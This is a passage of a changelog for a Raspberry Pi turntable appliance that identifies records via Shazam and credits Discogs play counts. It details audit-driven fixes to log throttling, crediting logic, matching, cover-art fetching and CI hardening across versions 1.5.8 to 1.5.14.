  MEDIUM, `R6-07`).** The single-track completion carve-out tested
  `len(closer.tracklist) == 1`, which counted never-playable bonus-CD rows, so an
  owned edition with one vinyl row + bonus CD was suppressed forever (its
  supporting-row count maxes at 1). The carve-out now counts VINYL rows, mirroring
  the R5-16(a) completion anchor.
- **The #185 replay boundary anchors on the first VINYL row, not tracklist row 0
  (#273 — LOW, `R6-08`).** R5-16(a) made only the closer vinyl-aware; a hybrid
  whose vinyl opener trails a leading CD/file row (global_index 1+) never matched
  the row-0 anchor, so a genuine re-drop merged into one credit for two plays. The
  anchor falls back to row 0, so a plain numbered / side-A-first tracklist is
  unchanged.
- **A custom field created on Discogs after boot is picked up without a restart
  (#274 — LOW, `R6-09`).** The field-not-found abort left the fieldless
  collection-fields map cached, so every later credit re-aborted against the stale
  cache and never re-hit the endpoint. Both the Play Count and Last Played aborts
  now drop the cache so the next write re-fetches (one extra GET per failed credit,
  paid only while misconfigured).
- **A raising detached split-finalize is reported once, not twice (#276 — NIT,
  `R6-11`).** The task's done-callback already logs any exception; the shielded
  await now contains a non-Cancelled raise instead of also propagating it through
  the recognition leg. Shutdown cancellation still propagates.

### Changed

- **The #195 "recognized with no active session" tripwire is softened (#275 —
  LOW, `R6-10`).** It flagged a benign same-turn SESSION_ENDED/MUSIC_STARTED
  interleave (which self-heals, no play lost) as a WARNING telling the operator to
  "check the wiring" on every occurrence. It is now an INFO line naming that
  benign case; a genuine wiring gap shows up as this recurring outside a session
  end.

### Documentation

- **Module docstring + dead-code notes corrected (#277 `R6-12`, #278 `R6-13` —
  NITs).** `listen_tracker`'s module docstring now describes the #186 read/set
  credit path (not `increment_play_count`, marked as having no production caller —
  routing the tracker back through it would reintroduce the #186 double-credit);
  and `track_commit_service`'s always-True `still_current()` re-check is documented
  as a defensive guard, not a live race.

## [1.5.14] — 2026-08-11

**Round-6 audit — Wave 1: stop the crash (log-throttle integrity, milestone
#31).** Ships the round's one CRITICAL — a process-killing regression introduced
by the R5 log-throttle consolidation — plus the three same-subsystem findings
around it. RED-repro-first, every fix mutation-pinned, cold "break-this" reviewed
(SPEC + QUALITY pass).

### Fixed

- **`LogThrottle.reset()` no longer crashes the process on the next repeated
  error (#266 — CRITICAL, `R6-01`).** In `per_message` mode `reset()` replaced
  the per-key `OrderedDict` with a plain `dict`, so the next *repeated* message
  hit `move_to_end` / `popitem(last=False)` — methods a plain dict lacks — and
  raised `AttributeError` inside the recognizer's `except` handler, killing the
  recognition leg and (via the `FIRST_COMPLETED` design) the whole app. Both
  recognizer throttles call `reset()` on every successful turn — including a
  plain miss — so ~2 identical errors after any success (ordinary flaky wifi)
  took the appliance down within a minute. `reset()` now clears the map in place
  (`.clear()`), preserving its `OrderedDict` type. Regression test drives a
  *repeated* key after `reset()`; the pre-fix test made only one *new*-key call,
  which a plain dict served, so it never caught the crash.
- **The capture-loop error log can't be flooded by two alternating messages
  (#267 — MEDIUM, `R6-02`).** `_capture_error_throttle` ran single-key, where any
  message change — including changing *back* — emits, so a device flapping
  between two failure shapes (~1 rebuild/s) defeated the 30s throttle and wrote
  ~1 journal/SD-card line per second. It is now `per_message` (the mode R5-13
  already applied to the recognizer sites), so each distinct error is
  rate-limited on its own interval. Lands with #266 so the mode's `reset()` is
  safe.
- **LRU eviction no longer silently discards an evicted message's suppressed
  tally (#268 — LOW, `R6-03`).** At the 64-key `per_message` cap, evicting a key
  dropped its held-back count, so a post-outage recovery summary understated how
  many repeated lines were swallowed. The count is now accumulated
  (`evicted_suppressed()`) and surfaced by `ThrottledLogger.reset()`.

### Removed

- **Dead `ThrottledLogger._last_msg` field (#269 — NIT, `R6-04`).** Written but
  never read since the R5-14 delegation moved the recovery flush onto
  `pending_items()`. Deleted, along with its now-unused `Optional` import and a
  stale `_last_log` docstring reference.

## [1.5.13] — 2026-08-11

**Round-5 audit — Wave 7: hardening & CI (milestone #30).** Close the round —
RED-repro-first, cold-reviewed (SPEC + QUALITY pass on every change).

### Fixed

- **The Discogs ID guard rejects silently-reshaped inputs (#263 — LOW,
  `R5-37`).** `_as_id`, which vets a release/instance/field ID before it is
  interpolated into a write URL, used a bare `int(value)` — so `bool`
  (`int(True) == 1`) and non-integer `float` (`int(3.9) == 3`) slipped through
  and built a valid-but-WRONG write path instead of failing loudly. It now
  accepts only a genuine `int` (bool explicitly excluded) or a clean ASCII
  integer string, rejecting bool, float, float-like and non-ASCII-digit strings,
  `Decimal`, and bytes at the boundary. Positive-only (`<= 0`) is unchanged.
- **Cover-art IP pinning prefers a reachable IPv4 address (#264 — LOW,
  `R5-32`).** `_validated_public_ip` pinned the FIRST resolved address; a
  dual-stack CDN that lists its AAAA record first would pin an IPv6 the appliance
  (a Pi on a frequently IPv4-only LAN) cannot route, so the cover silently never
  loaded. It now pins the first vetted IPv4, falling back to IPv6 only for a
  v6-only host. The SSRF guarantee is untouched — every resolved address is still
  vetted and the whole hop still fails closed if ANY address is non-public.

### Changed

- **CI runs on Python 3.11 AND 3.13, with a hardened workflow (#261 — MEDIUM,
  `R5-33`; #262 — LOW, `R5-35`).** `tests.yml` gained a `['3.11', '3.13']`
  matrix (`fail-fast: false`) so the audioop-lts / trixie path (#198) is exercised
  in CI, not just on the Pi. The workflow now declares `permissions: contents:
  read` and SHA-pins `actions/checkout` (v4.2.2) and `actions/setup-python`
  (v5.3.0) instead of floating tags — parity with the badge workflow's TQ-5
  hardening.

### Tests

- **Two latch-pair regression tests are no longer vacuous (#260 — MEDIUM,
  `R5-23`).** `test_reentrant_finalize_while_crediting_does_not_double_increment`
  and its loving twin set the re-entrancy latch but never armed the #182
  completion gate, so the guarded branch was never reached and both survived a
  mutation to the guard. Each now identifies a supporting track and asserts
  `completion_supported` before setting the latch; both previously-surviving guard
  mutations are now killed.

**Round-5 audit — Wave 6: efficiency (milestone #29).** Spend the API budget
once — behaviour-preserving reader.py refactors, RED-cost repros, cold-reviewed
(differential harness: 0 change to any match decision).

### Changed

- **A resolved album is fetched from Discogs once, not twice (#256 — MEDIUM,
  `R5-19`).** `_build_result` re-fetched `/releases/{id}` just to read the
  tracklist; it now parses the tracklist off the already-fetched release object
  (via a new `_parse_tracklist`), halving the per-album enrichment spend against
  the 60/min budget. `get_tracklist(release_id)` remains the standalone entry
  point; transient propagation is unchanged.
- **The same database search is issued once per resolve (#257 — MEDIUM,
  `R5-20`).** An unowned album ran the identical `(artist, album)` search 2–3×
  (strategy 1, the database tier, the staleness refresh). A one-entry memo fetches
  the page once and slices to each caller's limit; a different query replaces it.
- **The collection index folds its match keys once, at build (#258 — LOW,
  `R5-27`).** `search_collection` re-folded every index title/artist on every
  call (~8ms/miss at 3k records, worse on the Pi). The folded keys are precomputed
  at index-build time; the match logic reads them (falling back to on-the-fly
  folding for a hand-built index). Match decisions are byte-identical.
- **ChunkAssembler rolling-buffer copy accepted as-is (#259 — NIT, `R5-36`,
  closed won't-fix).** The ~7 MB/s `np.concatenate` memcpy is <1% of Pi 4 memory
  bandwidth; a ring buffer isn't worth the complexity. Documented for the record.

**Round-5 audit — Wave 5: observability (milestone #28).** Logs that tell the
truth — RED-test-first, mutation-checked, cold-reviewed.

### Changed

- **The two log-throttle implementations are consolidated (#249 — MEDIUM,
  `R5-14`).** `ThrottledLogger` (the recognizer's error-log helper) was a full
  parallel re-implementation of `LogThrottle`; it now delegates its throttle
  decision to the shared `LogThrottle` and keeps only the logging + recovery
  flush, so a throttle-policy fix lands once instead of drifting between two
  copies (the #220/#221 drift).

### Fixed

- **Alternating error messages can no longer defeat the SD-card flood
  protection (#250 — MEDIUM, `R5-13`; #252 — LOW, `R5-24`).** The throttle keyed
  on the last message with one message of memory, so two alternating conditions
  emitted a line per observation (~8,640/day) instead of a handful. A new opt-in
  per-message mode throttles EACH distinct message independently — a genuinely new
  message still surfaces at once (#178), but oscillation collapses to one line per
  message per interval, and each message reports its OWN suppressed tally (R5-24),
  never the previous message's. The per-key map is LRU-bounded so it stays bounded
  over 24/7 uptime.
- **A disabled Last.fm client no longer reports a false love (#251 — MEDIUM,
  `R5-22`).** `love()` is a graceful no-op returning True when the client is
  disabled (scrobble off, missing creds, pylast absent), so the completion gate
  logged "✅ Last.fm loved" and latched `loved=True` while nothing was sent. The
  gate now also requires the client to be enabled, and a one-time startup warning
  flags the love-wanted-but-disabled combo.
- **A leg that raises while unwinding shutdown is no longer swallowed (#253 —
  LOW, `R5-25`).** `run_pipeline`'s shutdown `gather` discarded results, so a
  non-cancellation exception during a pending leg's teardown vanished — exactly
  where cleanup bugs live. Such faults are now logged.
- **Log-and-continue boundaries carry a traceback (#254 — LOW, `R5-26`).** The
  Signal delivery guard and capture's callback / ticker error handlers logged
  only `str(e)`; they now pass `exc_info=True` so a swallowed exception on the
  headless appliance is diagnosable.

### Docs

- **love-on-completion is documented as targeting the album's closing track
  (#255 — LOW, `R5-34`).** config.example.yaml and architecture.md said "last
  identified track", contradicting the #181 behavior (`closing_track`).

**Round-5 audit — Wave 4: display fidelity (milestone #27, Lane-approved visual
changes).** Paint it right — RED-test-first, mutation-checked, cold-reviewed.

### Fixed

- **The ambient gradient now glows from behind the record (#245 — HIGH,
  `R5-09`).** It had been painted INVERTED since v1.2.0 — darkest at the 25%/35%
  origin (behind the cover), brightest at the screen edges — the opposite of the
  DESIGN.md spec. Brightness now decreases outward, so the surface-tinted peak
  sits at the origin and fades to bg at the edges. The brightest pixel drawn is
  still exactly GRADIENT_TEXT_PEAK (relocated, not raised), so the WCAG
  text-contrast guarantee is unchanged.
- **The boot/error arc is a fine hairline (#246 — LOW, `R5-28`).** The stamped
  stroke rendered ~5px (its stamp RADIUS was used as the width) vs the 1.5px
  spec; halved to a 3px band — the closest a pygame integer-radius circle
  approximates 1.5px while keeping the round-cap look.
- **`ellipsize` returns "" instead of an overflowing ellipsis (#247 — NIT,
  `R5-38`).** At a width narrower than the ellipsis glyph it returned "…" wider
  than the box; it now returns "" (caller shows nothing). Unreachable at
  1024×600; a correct backstop at degenerate widths.

### Changed

- **Docs: corrected the legibility-floor scale thresholds (#248 — LOW,
  `R5-30`).** CLAUDE.md claimed the floors bind at a single `s≈0.33`; in fact
  they bind per role (header `s≈0.82` … hero `s≈0.33`). None bind at the shipped
  1024×600.

## [1.5.12] — 2026-08-11

**Round-5 audit — Wave 3: availability & input hardening (milestone #26).** Stay
up, fail loud — each fix RED-test-first, mutation-checked, cold-reviewed.

### Fixed

- **The MusicBrainz cover-art lookup can no longer freeze the pipeline (#238 —
  HIGH, `R5-08`).** musicbrainzngs is urllib-based and set no socket timeout, so
  a stalled cover fetch froze `resolve()` — and, because resolves serialize, the
  whole commit pipeline — until restart. coverart now sets a process-wide default
  socket timeout (if unset), and the resolver wraps the call in `asyncio.wait_for`;
  a timeout is treated as transient (fallback returned, not cached, retried next
  track) so the pipeline never blocks.
- **A non-string field in an untrusted Shazam payload no longer wedges the loop
  (#239 — MEDIUM, `R5-10`).** A numeric title/subtitle/album/isrc crashed
  `_norm().split()` every chunk (no miss counted, display stuck on IDENTIFYING);
  all four are now `str()`-coerced at parse, and `_norm` is total.
- **`audio.silence_threshold_rms` is domain-checked (#240 — MEDIUM, `R5-11`).**
  0/negative made the silence test unreachable (idle chunks POSTed to Shazam,
  the #193 class); NaN killed recognition silently. Now must be finite and > 0.
- **Required config strings must be non-empty (#241 — MEDIUM, `R5-12`).** An
  empty device_name silently bound the first input device; an empty user_token /
  play_count_field_name failed only at runtime. All rejected at startup, with the
  token's value never echoed (SEC-3).
- **A transient index refresh no longer discards a good snapshot (#242 —
  MEDIUM, `R5-18`).** `refresh_index_and_research` nulled the collection index
  before rebuilding; a dropped GET left the reader index-less, forcing a full
  re-page on every later resolve. It now rebuilds swap-on-success, restoring the
  prior index if the rebuild raises.
- **A failed/pending cover download no longer respawns a decode every frame
  (#243 — MEDIUM, `R5-21`).** `_load_cover` now gates the off-loop decode on a
  cover-readiness signal set once `_prefetch_cover` lands the file (~10 no-op
  tasks/s + a blocking stat on the loop, for the whole track, are gone); a failed
  download records a bounded tally and blacklists past the bound.
- **http→https cover-URL upgrade drops the port (#244 — LOW, `R5-29`).**
  `http://host:80/x` became `https://host:80/x` and dialed TLS to port 80 (cover
  silently never loaded); the port (and userinfo) are now dropped so every fetch
  resolves to 443, also closing a trusted-host port-probing vector.

Deferred follow-ups carried with triggers: #218 / #219 (v1.6 / v1.7 roadmap
seams), #227 (reprise/bookend phantom double-credit), and #265 (Various
compilations miss the collection).

## [1.5.11] — 2026-08-11

**Round-5 audit — Wave 2: matching & recognition integrity (milestone #25).**
The wrong-credit / lost-credit cluster, each fix RED-test-first -> mutation-checked
-> independently cold-reviewed -> narrow-second-passed.

### Fixed

- **A stale mis-recognition can no longer commit a wrong track (#233 — HIGH,
  `R5-04`).** A hit on the CURRENT track now clears any half-accumulated pending
  competitor. Before, one stray misrecognition of B while A played left B pending
  for the rest of the side (misses deliberately don't clear it, REC-1), and a
  second isolated B hit — even 20 correct A chunks later — reached the
  confirmation threshold and committed B: wrong card, wrong scrobble, wrong Discogs
  credit. REC-1's alternating-recovery is preserved (only a current-track hit
  clears the pending; a miss still does not).
- **A foreign one-track single can no longer phantom-credit the latched album
  (#234 — HIGH, `R5-05`).** The #182 completion gate's single-track carve-out
  checked only the closer's tracklist length, not that the closer belonged to the
  latched release — so a Shazam swing to any 1-track single (whose sole row is
  is_last_track) passed the gate and credited the multi-track album it was latched
  to. The carve-out now also requires `closer.discogs_release_id ==
  album_release_id`; a genuine single-track release still credits.
- **Joint-artist albums now match the collection (#235 — HIGH, `R5-07`).** The
  index stored each release's artists as a list of individual names, and matching
  required ONE name to equal the entire folded query — so a Shazam joint credit
  ("Robert Plant & Alison Krauss") missed every collaboration album owned, on
  every play, silently degrading to the database tier with no Play Count. The
  index now also stores the reconstructed Discogs credit string (name + `join`,
  per-name disambiguator stripped) and matches the query against it, exactly.
  Compilations indexed under "Various" remain a documented residual (a wildcard
  there risks over-crediting a generic-title collision — the direction this core
  refuses).
- **Hybrid LP+CD releases now credit on the vinyl closer (#236 — MEDIUM,
  `R5-16`).** (b) `_match_side` requires a two-letter side label to be a DOUBLED
  letter (AA/BB), so a bonus "CD1"/"LP1"/"DV1" row no longer renders a fabricated
  "SIDE CD" caption. (a) `is_last_track` now anchors on the last VINYL-SIDE row,
  not the last tracklist row — so a full vinyl play of a hybrid LP+CD (whose
  tracklist appends bonus CD/digital rows) arms completion, where it previously
  never could (a permanent lost Play Count for every hybrid edition owned). This
  is a turntable tracker; the non-vinyl rows never play. A numbered/CD-only
  tracklist with no vinyl sides falls back to the last row (B-10 unchanged).
- **Invisible characters no longer defeat title matching (#237 — MEDIUM,
  `R5-17`).** `fold_text` now drops Unicode format (Cf) characters that carry no
  matching intent (zero-width space, soft hyphen, BOM, word joiner, bidi marks),
  so a single invisible char in a community-edited title or Shazam string can't
  make an owned album permanently — and undiagnosably — unmatchable. ZWNJ/ZWJ
  (U+200C/D) are kept, being lexically load-bearing in some scripts (folding them
  could merge genuinely different titles — the phantom direction).


## [1.5.10] — 2026-08-11

**Round-5 audit — Wave 1: phantom remediation & the credit write path (milestone
#24).** The fifth cold audit (`CODE_REVIEW_2026-08-10.md`) opened on a process
failure: commit `f800bbd`, which closed #186/#187/#192, contained **no code** —
only two untracked helper scripts were staged, so the Wave-2-bundle-2 fixes those
issues describe never shipped, while the v1.5.8 CHANGELOG and later v1.5.9 code
comments asserted they had (R5-01). All three were re-reproduced live at v1.5.9
and are now actually implemented, each RED-test-first -> mutation-checked ->
independently cold-reviewed -> narrow-second-passed:

### Fixed

- **Play Count no longer double-credits a single play on an ambiguous POST
  (#186 - HIGH, `R5-02`).** The end-of-session finalize retried the WHOLE
  read-modify-write, so a POST applied server-side whose response was lost (read
  timeout on flaky Pi Wi-Fi) made the retry re-read the incremented value and
  post `current+1` again - one play credited +2. The writer is split into
  `read_play_count` (read once) and an idempotent absolute `set_play_count`;
  `_credit_completed_album` reads once, computes the target once (memoised across
  attempts), and retries only the absolute set, so a re-POST writes the SAME value
  and can never double. `increment_play_count` is recomposed from the two halves,
  preserving its META-1/META-2/B-15/B-16 contract for its other callers.
- **A creditable album-split credit is no longer lost at shutdown (#187 -
  HIGH, `R5-03`).** The split finalize was awaited inline in the recognition
  pipeline leg, which `run_pipeline` cancels BEFORE `drain()`; the bare await
  propagated that cancellation into the credit and `drain()` (which waits only on
  `_bg_tasks`) never saw it. It now runs as a tracked `_bg_tasks` task awaited via
  `asyncio.shield`: normal operation still credits inline with unchanged timing
  and serialization (`_finalize_lock`), but the task is detached from the leg's
  shutdown cancellation so it survives into drain(). drain() keeps its short bound
  - the honoured-Retry-After sleep is a cancellable await, so at shutdown a
  still-in-flight credit is abandoned + logged LOST (the safe under-count
  direction) rather than stalling the Pi's power-cycle.
- **A second in-window 429 now honours a long Retry-After (#231 - HIGH,
  `R5-06`).** `request()` consulted `honor_long_retry_after` only on the FIRST
  429; a short first 429 slept once and retried, and when the retry ALSO 429'd
  with a long wait (the normal case inside a real throttle window) that header was
  dropped and the 429 returned - so the finalize layer fell back to its futile
  in-window backoff, the loss #229 exists to prevent, one hop later. The
  post-retry branch now parses the second Retry-After and raises
  `DiscogsRateLimited` when it is beyond the cap and honoured, preserving the
  at-most-one-retry contract and the non-honoured return path.
- **`Retry-After` in HTTP-date form is parsed, not defaulted (#232 - LOW,
  `R5-31`).** RFC 7231 allows an absolute HTTP-date; `int()` raised on it and the
  code fell back to the 2s default, turning a two-minute server backoff into a 2s
  in-window retry that just 429'd again. New `_parse_retry_after()` handles both
  integer-seconds and HTTP-date, clamps a past/negative result to 0, and defaults
  only when the header is absent or genuinely unparseable; used at both 429 parse
  sites.

### Changed

- **#192 (`R5` reopen) - corrected stale comments and misleading logs on the
  credit path.** The transport module comment still described `request()` as
  running on the SHARED `run_in_executor(None,...)` pool and deferred long-wait
  handling "to the dedicated executor (#61)" though #61 shipped and #229
  superseded the deferral; it now states the post-#61/#229 reality. The two
  "caller has no further retry, so the write (e.g. a Play Count credit) may be
  lost" ERROR strings were false for the finalize-retried, honor-capable Play
  Count credit; they now name the single-shot (Last Played) vs finalize-retried
  (Play Count) distinction.


## [1.5.9] — 2026-08-10

**Round-4 follow-ups (#222–#230).** The residuals the R4 cold audit filed as
separate follow-ups, each through the same RED-test → mutation-check →
independent-audit discipline. #227 (reprise/bookend phantom double-credit) stays
**deferred**: a genuine short re-drop and a reprise false-boundary both produce a
2-row remainder session, so no rule separates them without the clock/counter
dependency #185 deliberately rejected — a "fix" could only be bought at the cost
of regressing #185's genuine re-drop crediting, so it remains documented (in
`listen_tracker.py` and the #185 CHANGELOG entry) pending real hardware evidence.

### Changed

- **The reader's collection-match normalization is unified onto the shared
  `normalize.fold_text` (#225 — LOW, tech debt).** #179 gave `reader.py` a private
  `_PUNCT_FOLD` / `_normalize_term` / `_TRAILING_PAREN_RE`; #180 later created the
  shared `normalize.py` for `SideIndex` but deliberately didn't refactor the
  reader (cross-fix blast-radius control), leaving two fold tables that could
  drift. The reader now folds through the one shared table, and the private
  duplicates are deleted. The single behavioural change is a **widening**: the
  `&`→`and` fold now applies to ALBUM titles too, so "Songs of Love & Hate"
  matches an owned "Songs of Love and Hate" — the exact symptom #180 fixed at the
  track level, now closed at the album level.
- **A long Discogs `Retry-After` on the Play Count credit is now honoured instead
  of losing the credit (#229 — enhancement).** On a `429 Retry-After: N` beyond
  the transport's 10s in-thread cap, the credit's read-modify-write no longer
  burns all three finalize attempts inside the same throttle window (≈3s, every
  one a guaranteed 429). The transport raises a typed `DiscogsRateLimited` for the
  opted-in idempotent write (and its reads), and the finalize layer waits the
  server-requested backoff out **in the event loop** (`asyncio.sleep`, capped at
  90s) before retrying — cancellable at shutdown (parks no worker thread) and,
  since CONC-2/#96, outside the lifecycle lock (so it never stalls the next
  record's session START). #186's idempotent absolute-set means the honoured
  re-POST writes the same value, so honouring the wait cannot double-credit.
  _(Correction, R7-06 / [1.5.21]: this does NOT mean the honoured wait never
  stalled anything — an album-SPLIT credit was awaited inline by the recognition
  leg, so a honoured wait blocked chunk processing for its full duration until
  the inline wait was bounded in 1.5.21.)_

### Fixed

- **A decorated Shazam album no longer credits a plain-titled owned family member
  (#222 — LOW, data-integrity).** The tier-2 collection-match strip is now
  keyword-gated and bare-year-excluded: "(Blue Album)" and a distinguishing
  "(1975)" are no longer treated as decoration, so playing "Weezer (Blue Album)"
  while owning only the Green "Weezer", or "Live (1975)" against an owned plain
  "Live" + "Live (1980)", now correctly refuses rather than crediting the wrong
  record. Genuine edition decoration ("(Deluxe Edition)", "[30th Anniversary]")
  still strips, brackets included, and — because the strip now runs on folded
  text — fullwidth "（Deluxe Edition）" strips too.
- **Strategy 1 no longer bypasses strategy 2's refuse-to-guess for distinct
  identically-titled albums (#226 — LOW/MEDIUM, data-integrity).** Owning two
  DISTINCT albums that share a normalised (artist, title) — the Peter Gabriel
  self-titled family — strategy 2 correctly refused, but strategy 1 would credit
  whichever the loose search surfaced. Strategy 1 now defers to strategy 2's
  refusal when the collection holds ≥2 such entries with **distinct masters**
  (distinct works), while still crediting genuine multi-**pressing** ownership
  (shared or absent master). Documented residual (accepted): two distinct
  same-titled albums that BOTH lack a Discogs master are data-indistinguishable
  from pressings, so one is still credited — the canonical self-titled families
  all carry masters, so this bites only for obscure master-less releases.
- **`is_transient` now classifies a `JSONDecodeError` as transient (#228 —
  LOW).** python3-discogs-client calls `json.loads()` on the response body
  *before* building its `HTTPError`, so during a real outage a 429/5xx carrying a
  non-JSON body (a Cloudflare/HTML error page) raises `JSONDecodeError` — which
  `is_transient` returned `False` for, misclassifying a genuine transient outage
  as permanent (album cached as a downgrade instead of retried). Added
  `json.JSONDecodeError` to the transient set, scoped precisely (it is a
  `ValueError` subclass; a bare `ValueError` stays non-transient).
- **Cover cache sweeps `.part` orphans in-uptime, not only at construction (#230
  — LOW).** `_sweep_partials()` now also runs from `_prune()` (after every
  download), so a partial stranded within one long uptime on the 24/7 appliance
  is cleared without waiting for the next boot. The in-uptime sweep is **age-gated**
  (`_PARTIAL_SWEEP_MIN_AGE_SECONDS`) so it never unlinks a *concurrent* download's
  fresh in-flight tempfile on the shared executor — only genuine orphans.
- **`side_position` no longer desyncs from `track_display` for a duplicated title
  with out-of-order rows (#224 — nit).** `SideIndex.from_tracklist` now locates
  `side_position` by the current entry's *identity* within the number-sorted
  side, not by re-matching the title — so `[("A2","Theme"),("A1","Theme")]`
  querying "Theme" reads a coherent "A2 · 02 OF 02" instead of "A2 · 01 OF 02".

## [1.5.8] — 2026-08-10

> **Correction (R5-01, 2026-08-11):** the #186 / #187 / #192 entries below
> describe fixes that were NOT actually committed — their closing commit
> `f800bbd` staged only untracked helper scripts, no code. The described
> behaviour did not ship in v1.5.8 or v1.5.9; it is implemented for real in the
> next release (see the Round-5 Wave 1 entry under [Unreleased]). The entries are
> left in place, struck through, as the historical record of the phantom
> remediation.

**Round-4 audit remediation — Waves 1–7 (milestones #17–#23).** The fourth cold
audit (2026-08-07) filed #179–#221; this release lands the remediation, each fix
through the same implement → RED test → mutation-check → independent cold-review
discipline. #218 and #219 (the v1.6 / v1.7 roadmap seams) are intentionally
deferred with triggers.

### Changed

- **The commit-path session-epoch invariant now lives in one `EpochGuard`
  (#217 — MEDIUM, Wave 7 bundle 9; behaviour-preserving).** The rule "after any
  await in the commit path, re-validate the audio's session epoch before the next
  side effect" was ~8 hand-placed point checks, and five separate past bugs
  (B-1 #1, PCONC-1 #80, B-19 #68, LB-1 #84, CONC-6 #87) were each one await
  missing one re-check. `PlayerState.epoch_guard(audio_epoch)` now returns an
  `EpochGuard` bound once to the audio's own epoch; `TrackCommitService.commit()`
  threads that guard through every step — the four inline
  `session_epoch != audio_epoch` comparisons became `guard.is_stale()` /
  `guard.still_current()`, the tracker's CONC-6 post-lock check is handed
  `guard.is_stale` as a live BOUND METHOD (never a precomputed bool), and the
  scrobble runs through `guard.run(...)` — the sanctioned way to add a new
  commit-path side effect after an await (a v1.6 play-history append would compose
  with it instead of needing its own remembered check). The recognizer's
  enqueue-time epoch bind (PCONC-1) and its `_last_epoch`/`_pending_epoch` health
  counters are deliberately untouched — different invariants. All epoch tests
  (B-1/PCONC-1/B-19/LB-1/CONC-6) stay green; the load-bearing gates are
  mutation-verified.

- **Shared `src/util/` extractions — one bounded-LRU cache and one log throttle,
  no longer hand-rolled per module (#220 / #221 — Wave 7 bundle 8).** Both are
  behaviour-preserving; every existing test stays green and each behaviour was
  additionally mutation-verified.
  - **#220 (arch-4):** `BoundedCache` moved to `src/util/cache.py` (re-exported
    from `renderer.py` as `_BoundedCache` so the six renderer caches and all
    importers keep resolving). `MetadataResolver`'s album cache — previously a
    hand-rolled second copy of the same insertion-order/LRU-evict algorithm that
    had already drifted on replace semantics — now uses it, with the #191
    downgrade-TTL kept on top (a new `BoundedCache.pop` backs the stale eviction).
    One algorithm, one test home (`tests/test_util_cache.py`).
  - **#221 (arch-5):** the summarizing-log-throttle pattern (the `-inf` monotonic
    seed was documented twice because it was re-derived twice) is now
    `src/util/logthrottle.py` — one class with optional interval (None = pure
    dedup, never periodic re-warn) and optional change-key. `capture.py`'s four
    always-on log sites (PCONC-4 drop-warn, #178 error-log, and the two #164
    device dedups) all route through it, so a future always-on site reuses it
    instead of becoming copy #6. The three distinct contracts the sites need are
    preserved exactly (verified: the capture suite plus mutation checks).

- **A latched-release session must identify ≥2 tracks of that release to earn
  its Play Count / Last Played / love (#182 — MEDIUM, `R4:gap1-3`; behaviour
  change approved by Lane 2026-08-08).** A Shazam attribution swing —
  per-track album attribution jumping to an owned compilation for a hit
  single — minted a one-track split-off session whose sole track latched the
  compilation AND armed `potential_last_track` (compilations routinely close
  with the hit); the next track's split then finalized it as a "completed
  album": a phantom Play Count + fresh Last Played for a record that never
  left its sleeve (executed repro: one straight-through album play issued TWO
  increments). The gate (`PlaySession.completion_supported`) requires the
  closer's row plus one supporting row of the same release — **distinct
  resolved tracklist rows** (`side_index.global_index`), so a decorated
  re-identification of the closer ("The Hit - 2011 Remaster") resolves to
  the same row and cannot fake supporting evidence (first cold-review
  catch), while genuine same-base sibling rows ("Golden Hour" / "Golden
  Hour (Acoustic)", variants-only 12" EPs) each count (second-pass catch —
  a decoration-base rule wrongly suppressed those; both directions
  regression-pinned). Identifications that resolve to no row contribute
  nothing — with a carve-out for
  genuine single-track releases (their full play IS one track); release-less
  (FALLBACK) tracks don't count as support, and unlatched sessions are not
  the gate's concern. Suppression is logged loudly (`#182` in the message) so
  the one legitimately-affected case — a deliberate needle-drop on just an
  album's closer, which previously credited — is diagnosable. Missed count
  preferred over phantom count (the META-4 posture). The same gate covers the
  Last.fm love (love-on-*completion* — a completion that didn't happen).

### Tests

- **Mutation pins for code three rounds of discipline missed (#209 / #210 / #211
  / #212 / #213 — Wave 6 bundle 6).** Test-only; no production behaviour changed.
  Each defect was reproduced as a surviving mutant (a reversion that passed the
  full suite) and is now pinned RED:
  - **#209 (MEDIUM)** — `AudioCapture.run()`'s block loop is the single
    integration point feeding the whole pipeline (silence → session lifecycle;
    recognizer → display/scrobble), and its happy path never executed: a mutant
    dropping every chunk passed. Added a run()-level test that pushes a real block
    and asserts `silence.process` + (music-gated) `recognizer.enqueue` are called
    with the sample rate, a `_dispatch_chunk` gate test (no recognition while the
    detector reports no music, #193/#195), and the `None` stop-sentinel case.
  - **#210 (MEDIUM)** — `_finalize_write_with_retry`'s except branch (a raised
    Play Count write counts as a failed attempt and is retried, #163) was
    unpinned; every existing retry test used only falsy returns. Added raise-then-
    succeed (credited, 2 attempts) and raise-always (credit lost, logged, bound
    exhausted, no propagation) tests.
  - **#211 (MEDIUM)** — the Discogs database tier (`search_database`, resolving
    every non-owned album) and `_build_result`'s cover/label branches had zero
    coverage; a triple mutation (tier → `return None`; primary-image preference
    inverted + `uri`→`resource_url`; catalog-number `"none"` filter dropped)
    passed. Added realistic-Release-mock tests for the tier's build/skip loop and
    the image-preference + label/catno-`"none"` extraction, and gave the resolver
    factory a `genres` key for shape parity with the real producer.
  - **#212 (LOW)** — shipped-value pins the MUT-9 closure omitted:
    `_DOWNLOAD_DEADLINE_SECONDS == 45` (the SEC-4 slow-drip budget) and
    `_RECOGNIZE_TIMEOUT_SECONDS == 30` (the PCONC-2 bound, plus that the loop
    actually seeds `recognize_timeout` from it) — both were mutable to 10⁹ green.
  - **#213 (LOW)** — the STAB-5 `_cover_version` bump in `_decode_cover_async`
    (mutating it to `pass` survived) is pinned via the existing clean-decode test.

- **`DisplayRenderer.run()` loop coverage (#215 — Wave 6 bundle 7).** Test-only.
  The whole async render loop had zero coverage: the QUIT / ESC stop paths, the
  reset-`_dirty`-BEFORE-`_render()` ordering (the P-3 "goes quiet at steady
  state" mechanism, and what makes the #208 settle fire), and the 30-vs-10fps
  cadence were all unpinned. Added five tests that drive the real loop under the
  SDL dummy driver — each mutation-verified (QUIT/ESC arm removed, cadence pinned
  to one rate, `transitioning` comparison flipped, and dirty-reset moved after
  render all go RED).

### Fixed

- **Doc/comment drift: recognition backends and suite runtime (#214 / #216 —
  Wave 6 bundle 7).** Docs only; no behaviour change. `README.md`,
  `docs/architecture.md`'s config table, and `recognizer.py`'s module docstring
  all advertised `acrcloud`/`audd` as usable `recognition.backend` values, but
  since #93 (CRIT-2) `config.py` rejects everything except `shazamio` at startup
  — so an operator following the docs would hit a ConfigError. Reconciled all
  three to "shazamio today; acrcloud/audd planned/rejected until built."
  Separately, `docs/testing-guide.md` claimed the suite runs "in well under a
  second" (measured ~5s at 1000+ tests); changed to an order-of-magnitude phrase
  ("a few seconds on a laptop, tens of seconds on the Pi"), consistent with the
  T-8 treatment of the test count three lines below.

- **Display correctness — status-strip WCAG contrast, background-task exception
